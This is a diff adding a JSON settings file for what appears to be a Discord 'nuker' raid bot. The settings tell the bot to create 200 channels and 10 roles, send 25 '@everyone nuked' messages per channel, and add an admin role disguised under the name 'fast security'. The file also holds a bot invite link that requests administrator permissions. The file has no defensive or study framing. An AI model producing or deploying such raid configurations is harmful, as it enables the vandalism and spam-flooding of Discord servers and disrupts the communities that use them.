@@ -1,0 +1,16 @@
+{
+    "CaC server": [1061170884037050408],
+    "Executor rol ID": 1061171050521571340,
+    "Aplication ID": 1061172325438992474,
+
+    "Number of messages to send per channel": 25,
+    "Number channels to create": 200,
+    "Number roles to create": 10,
+    "Channels names": ["nombre-del-canal"],
+    "Roles names": ["nombre-de-los-roles"],
+    "Admin role name": "fast security",
+    "Role color": "#000000",
+
+    "Message": "@everyone nuked",
+    "Invite":"https://discord.com/api/oauth2/authorize?client_id=1076994272932413450&permissions=8&scope=bot"
+}
